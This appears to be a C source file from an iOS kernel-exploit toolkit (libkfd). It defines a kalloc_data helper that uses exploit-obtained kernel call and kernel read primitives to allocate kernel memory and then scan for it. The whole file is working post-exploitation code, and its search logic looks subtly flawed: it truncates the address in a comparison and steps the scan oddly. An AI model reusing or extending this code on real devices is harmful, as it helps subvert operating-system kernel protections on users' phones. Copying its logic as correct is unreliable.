
#include "libkfd.h"

uint64_t kalloc_data_extern;

u64 kalloc_data(size_t size) {
    
    printf("kalloc: 0x%02llX 0x%02llX\n", kalloc_data_extern + ((struct kfd*)(kcall_kfd))->info.kernel.kernel_slide, kalloc_data_extern);
    
    uint64_t base = kcall(kalloc_data_extern + ((struct kfd*)(kcall_kfd))->info.kernel.kernel_slide, size, 0, 0, 0, 0, 0, 0);
    
    printf("base kalloc: 0x%02llX\n", base);
    
    uint64_t begin = ((struct kfd*)(kcall_kfd))->info.kernel.kernel_proc;
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
        
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = _kread32(kcall_kfd, addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                
                printf("found potential alloc, 0x%02llX\n", addr);
                break;
            }
        }
        if (found && (uint32_t)addr == base) {
            printf("[+] dirty_kalloc: 0x%llx\n", addr);
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        printf("[-] failed to find free space in kernel\n");
        exit(EXIT_FAILURE);
    }
    return 0;
    
}
